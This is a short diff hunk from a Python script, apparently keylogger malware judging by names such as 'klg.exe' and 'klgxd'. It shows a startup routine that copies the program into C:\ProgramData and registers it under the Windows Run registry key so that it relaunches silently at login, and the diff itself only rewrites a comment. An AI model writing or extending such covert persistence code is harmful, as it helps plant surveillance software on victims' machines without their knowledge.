@@ -80,7 +80,7 @@ def add_to_startup():
     bat_path = "C:\\ProgramData\\klg.exe"
     # Copy itself to the specified path
     cmd(f'copy "{script_path}" "{bat_path}"')
-    # Create the batch file to run the script
+    # Create the reg key to autorun
     key = HKEY_CURRENT_USER
     key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
     entry_name = "klgxd"
